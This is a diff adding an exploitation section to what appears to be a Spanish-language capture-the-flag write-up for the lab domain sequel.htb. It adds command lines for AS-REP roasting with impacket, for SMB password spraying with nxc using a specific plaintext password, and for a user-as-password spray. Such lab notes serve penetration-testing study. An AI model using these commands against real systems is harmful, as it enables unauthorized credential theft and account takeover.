@@ -69,3 +69,20 @@ kerbrute userenum --dc 10.129.232.128 -d sequel.htb users.txt
 # Explotación
 ## AS-REP Roasting Attack
 
+```shell
+impacket-GetNPUsers -no-pass -usersfile users.txt sequel.htb/
+```
+
+## Password spraying
+
+```shell
+nxc smb 10.129.232.128 -u users.txt -p 'KxEPkKe6R8su' 
+```
+
+
+## User as Password
+
+```shell
+nxc smb 10.129.232.128 -u users.txt -p users.txt --no-bruteforce
+```
+
